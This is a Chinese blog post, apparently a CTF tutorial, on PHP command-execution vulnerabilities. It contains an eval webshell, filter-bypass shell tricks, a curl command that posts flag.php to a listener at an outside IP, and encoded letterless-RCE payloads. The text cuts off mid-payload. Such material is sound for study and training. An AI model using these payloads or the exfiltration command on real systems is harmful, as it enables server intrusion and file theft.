<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="PHP命令执行最全面的总结"><meta name="keywords" content=""><meta name="author" content="Air"><meta name="copyright" content="Air"><title>PHP命令执行最全面的总结 | Air</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">1、什么是命令执行漏洞？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2%E3%80%81%E5%88%9D%E8%AF%86%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.</span> <span class="toc-text">2、初识命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1%E4%BB%8E%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%BC%80%E5%A7%8B"><span class="toc-number">2.1.</span> <span class="toc-text">2.1从一句话木马开始</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2%E6%88%91%E4%BB%AC%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.2.</span> <span class="toc-text">2.2我们如何利用命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-1%E5%B8%B8%E8%A7%81%E7%9A%84%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1常见的系统命令执行函数绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-2%E5%B8%B8%E8%A7%81%E7%9A%84php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2常见的php命令执行绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%B8%80%EF%BC%8C%E7%94%A8%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%BF%9B%E8%A1%8C%E8%BF%87%E6%BB%A4"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">方式一，用正则表达式进行过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E6%88%96"><span class="toc-number">2.2.2.1.1.</span> <span class="toc-text">1、或</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E5%8F%96%E5%8F%8D"><span class="toc-number">2.2.2.1.2.</span> <span class="toc-text">2、取反</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E3%80%81%E5%BC%82%E4%BD%8D"><span class="toc-number">2.2.2.1.3.</span> <span class="toc-text">3、异位</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4%E3%80%81%E8%87%AA%E5%A2%9E"><span class="toc-number">2.2.2.1.4.</span> <span class="toc-text">4、自增</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%BA%8C%E3%80%81%E7%94%A8disabled-function%E7%9A%84%E6%96%B9%E5%BC%8F%E9%99%90%E5%88%B6%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">方式二、用disabled_function的方式限制函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E5%88%A9%E7%94%A8php%E8%87%AA%E8%BA%AB%E5%87%BD%E6%95%B0%E5%8E%BB%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.2.2.1.</span> <span class="toc-text">1、利用php自身函数去读文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E7%BB%95%E8%BF%87%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.2.2.2.</span> <span class="toc-text">2、绕过攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#https-www-freebuf-com-articles-network-263540-html"><span class="toc-number">2.2.2.2.3.</span> <span class="toc-text">https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;network&#x2F;263540.html</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://i.loli.net/2021/10/09/59agnYkNZjsywtL.jpg"></div><div class="author-info__name text-center">Air</div><div class="author-info__description text-center">尽全力去做好一件事</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">10</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://up.enterdesk.com/edpic_source/02/0a/a7/020aa727e55adc7a529dc3b223b100e4.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Air</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">PHP命令执行最全面的总结</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-12-09</time><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">2.7k</span><span class="post-meta__separator">|</span><span>Reading time: 11 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><blockquote>
<p>总结一下PHP中命令执行的方法，把知识点汇成一个体系，Work hard！</p>
</blockquote>
<h1 id="1、什么是命令执行漏洞？"><a href="#1、什么是命令执行漏洞？" class="headerlink" title="1、什么是命令执行漏洞？"></a>1、什么是命令执行漏洞？</h1><p>以php为例，产生该漏洞的原因就是系统在某个点调用了可以执行命令的函数，如eval，system,特殊(include)等，这些函数的参数用户可控，进而黑客可以执行一些对系统有威胁的命令，如获取敏感文件、删除信息等，进而危害到系统。其他语言如java、python也是如此。</p>
<p>在CTF比赛中，命令执行一直作为一个常见的考点，初学者应牢牢掌握此考点。</p>
<h1 id="2、初识命令执行"><a href="#2、初识命令执行" class="headerlink" title="2、初识命令执行"></a>2、初识命令执行</h1><h2 id="2-1从一句话木马开始"><a href="#2-1从一句话木马开始" class="headerlink" title="2.1从一句话木马开始"></a>2.1从一句话木马开始</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>初学者一般会看到这个函数，最开始对代码没有了解的情况下，直接去看wp，会告诉你用蚁剑或者菜刀连接，连上之后我们会发现直接可以查看服务器上的所有文件了，那么这种究竟是什么原理呢? </p>
<p>eval，即执行命令的函数，(在php中与之相近的有assert，这个之后进行总结)可以执行POST传入的东西，而$_POST为一个数组，类似于python中的字典，java中的map，其中储存的是键名和键值，在php环境中，可以直接传参，然后数据就会被储存进该数组中，在上面代码中仅仅是把键名为a的值取出来执行而已。</p>
<p>而我们常用的蚁剑，菜刀等工具，就是通过给$_POST数组中的数据传输他们已经写好的命令，然后根据所返回的值，去模拟终端，模拟文件管理器。</p>
<h2 id="2-2我们如何利用命令执行"><a href="#2-2我们如何利用命令执行" class="headerlink" title="2.2我们如何利用命令执行"></a>2.2我们如何利用命令执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通常来说，我们如果看到上述命令就可以直接去利用，可以用蚁剑菜刀连接，但是这是个人都能做，出题人不会这么直接给你送分，所以一般要整些活，那么都会整什么活呢？</p>
<p>一般来说，出题者让我们执行的命令通常有两种，一种是系统命令，一种是php的命令，而系统命会包含在php命令里，因为系统命令的执行也是通过调用php函数system等来执行的。</p>
<h3 id="2-2-1常见的系统命令执行函数绕过"><a href="#2-2-1常见的系统命令执行函数绕过" class="headerlink" title="2.2.1常见的系统命令执行函数绕过"></a>2.2.1常见的系统命令执行函数绕过</h3><p>最开始通常会过滤一些linux命令，如cat，等等，这时候就需要我们用一些小技巧去绕过了，如命令代替，LInux下通配符的使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat 替代品 tac tail nl less more  ca\t  (用反斜杠去截断过滤 ) ca&#x27;&#x27;t（用双引号截断过滤）</span><br><span class="line"></span><br><span class="line">空格 替代品 &lt; $&#123;IFS&#125; $IFS$9 %09 %0a</span><br><span class="line">linux下空格绕过</span><br><span class="line">&#123;cat,flag.txt&#125; </span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg</span><br><span class="line">cat%09flag.php</span><br><span class="line"></span><br><span class="line">cp fla?.php 1.txt访问1.txt </span><br><span class="line"></span><br><span class="line">利用变量绕过a=l;b=s;$a$b</span><br></pre></td></tr></table></figure>

<p>用curl外带flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 7499</span><br><span class="line">curl -F &quot;XX=@flag.php&quot; -X POST  http://119.91.92.171:7499</span><br><span class="line">适用于无回显时执行命令 如shell_exec 等</span><br></pre></td></tr></table></figure>

<p>利用环境变量拼接</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;PATH:5:1&#125;<span class="variable">$&#123;PATH:2:1&#125;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/12/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%9C%80%E5%85%A8%E9%9D%A2%E7%9A%84%E6%80%BB%E7%BB%93/image-20211210101111929.png" alt="image-20211210101111929"></p>
<h3 id="2-2-2常见的php命令执行绕过"><a href="#2-2-2常见的php命令执行绕过" class="headerlink" title="2.2.2常见的php命令执行绕过"></a>2.2.2常见的php命令执行绕过</h3><p>首先看到一个eval函数肯定是要想执行系统命令的，php所有可以用来执行系统命令的函数如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system() </span><br><span class="line">shell_exec()</span><br><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">popen()</span><br><span class="line">形式上还有 `cmd`  (即利用反引号执行命令) </span><br><span class="line">值得注意的是除了system和passthru没有返回值，即执行命令后的结果不会出现，这时候就需要用到之前讲绕过时候说的利用curl去外带flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>php命令执行通常有两种过滤</p>
<h4 id="方式一，用正则表达式进行过滤"><a href="#方式一，用正则表达式进行过滤" class="headerlink" title="方式一，用正则表达式进行过滤"></a>方式一，用正则表达式进行过滤</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">案例一(非常经典)</span><br><span class="line">无字符数字Rce</span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9]/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;还想输入数字字符？做梦呢？&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>代码非常简单，传入一个参数，判断其中是否有字符，如果有A-Z a-z 0-9字符，那就die，如果没有，那就执行命令<br>乍一看这好像是个无解的题，那么如何去绕过过滤呢，这就要提到eval的一些特性了(system等不具备，因为他们执行的不是php的命令)</p>
<p>eval即把传入的参数作为php命令执行，支持语法的嵌套，即可执行多个命令，那么我们是不是可以传入一些没有被过滤的字符然后通过一些变换，使之转换成我们想要使用的字符，然后再让eval去执行他呢？答案是可以的</p>
<p>php中有三个符号可以进行变换字符，</p>
<p>分别是“~”(取反)   “^”(异位)  |(或)  ^(与)  (++)自增，可以把这三种当做特殊的函数去看待，</p>
<h5 id="1、或"><a href="#1、或" class="headerlink" title="1、或"></a>1、或</h5><p>demo</p>
<p><img src="/2021/12/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%9C%80%E5%85%A8%E9%9D%A2%E7%9A%84%E6%80%BB%E7%BB%93/image-20211210104441559.png" alt="image-20211210104441559"></p>
<p>只要传入时把其放在两个字符串中间，其就可以执行，这时候我们就可以写一个小脚本去爆破了，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> <span class="variable">$cmd</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pass_waf</span>(<span class="params"><span class="variable">$waf</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$str</span>=[];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;=<span class="number">127</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">     <span class="keyword">if</span> (!preg_match((<span class="variable">$waf</span>),chr(<span class="variable">$i</span>)))&#123;</span><br><span class="line">        array_push(<span class="variable">$str</span>,<span class="variable">$i</span>);</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str1</span>=pass_waf(<span class="string">&quot;/[A-Za-z0-9]/&quot;</span>);</span><br><span class="line"><span class="variable">$str2</span>=pass_waf(<span class="string">&quot;/[A-Za-z0-9]/&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$str1</span> <span class="keyword">as</span> <span class="variable">$v1</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$str2</span> <span class="keyword">as</span> <span class="variable">$v2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> (chr(<span class="variable">$v1</span>)|chr(<span class="variable">$v2</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;      &quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> (urlencode(chr(<span class="variable">$v1</span>)));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;|&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> (urlencode(chr(<span class="variable">$v2</span>)));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对生成的结果进行拼接即可 如想执行phpinfo</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd=(&quot;%10%28%10%29%0E%06%0f&quot;|&quot;%60%60%60%60%60%60%60&quot;)();即可</span><br><span class="line">在php7下可以用 因为php支持动态执行函数 即(&#x27;phpinfo&#x27;)();可以被当做命令执行</span><br></pre></td></tr></table></figure>

<h5 id="2、取反"><a href="#2、取反" class="headerlink" title="2、取反"></a>2、取反</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这个比较简单</span><br><span class="line"><span class="keyword">echo</span> urlencode(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line">%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span></span><br><span class="line">cmd=(~<span class="string">&#x27;%8F%97%8F%96%91%99%90&#x27;</span>)();</span><br><span class="line">这里需要提前url编码一下，因为取反之后输出的都是乱码字符，如果直接复制上去，可能会出问题。</span><br></pre></td></tr></table></figure>

<h5 id="3、异位"><a href="#3、异位" class="headerlink" title="3、异位"></a>3、异位</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">这个和或是同理的 改下上面的脚本在进行拼接即可</span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$cmd</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pass_waf</span>(<span class="params"><span class="variable">$waf</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$str</span>=[];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;=<span class="number">127</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">     <span class="keyword">if</span> (!preg_match((<span class="variable">$waf</span>),chr(<span class="variable">$i</span>)))&#123;</span><br><span class="line">        array_push(<span class="variable">$str</span>,<span class="variable">$i</span>);</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str1</span>=pass_waf(<span class="string">&quot;/[A-Za-z0-9]/&quot;</span>);</span><br><span class="line"><span class="variable">$str2</span>=pass_waf(<span class="string">&quot;/[A-Za-z0-9]/&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$str1</span> <span class="keyword">as</span> <span class="variable">$v1</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$str2</span> <span class="keyword">as</span> <span class="variable">$v2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> (chr(<span class="variable">$v1</span>)^chr(<span class="variable">$v2</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;      &quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> (urlencode(chr(<span class="variable">$v1</span>)));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;^&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> (urlencode(chr(<span class="variable">$v2</span>)));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">payload:cmd=(<span class="string">&quot;%5b%5b%5b%5b%5b%5b%5b&quot;</span>^<span class="string">&quot;%2b%13%2b%12%15%1d%14&quot;</span>)();</span><br><span class="line">同样，这种方法只适用于php7</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="4、自增"><a href="#4、自增" class="headerlink" title="4、自增"></a>4、自增</h5><p>就和c语言一样，php也可以自增，可以利用该特性理论上获取任何字符</p>
<p><img src="/2021/12/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%9C%80%E5%85%A8%E9%9D%A2%E7%9A%84%E6%80%BB%E7%BB%93/image-20211212174405943.png" alt="image-20211212174405943"></p>
<p>有的人这时候可能会有疑问了，不是把所有字母都给过滤了吗？那如何得到A呢？</p>
<p><img src="/2021/12/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%9C%80%E5%85%A8%E9%9D%A2%E7%9A%84%E6%80%BB%E7%BB%93/image-20211212174808347.png" alt="image-20211212174808347"></p>
<p>可能大家会对这段代码有点疑问，我解释一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[];<span class="comment">//让_变量成为一个数组</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&quot;<span class="subst">$_</span>&quot;</span>;<span class="comment">//让_变量获取到数组的值，即Array</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="number">0</span>];利用索引获得A的第一个值</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;</span><br><span class="line">有时候会把数字也过滤了，那就可以利用</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;#&#x27;</span>==<span class="string">&#x27;!&#x27;</span>];这种形式来代替<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>直接上一个写好的payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmd=%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">5</span>B%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">40</span>%<span class="number">22</span>%<span class="number">24</span>_%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">5</span><span class="string">B&#x27;!&#x27;</span>%<span class="number">3</span>D%<span class="number">3</span>D<span class="string">&#x27;%40&#x27;</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span> ___%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span> B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__% <span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">2</span> <span class="number">4</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>_ _%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span> __%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_ _%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B %<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span 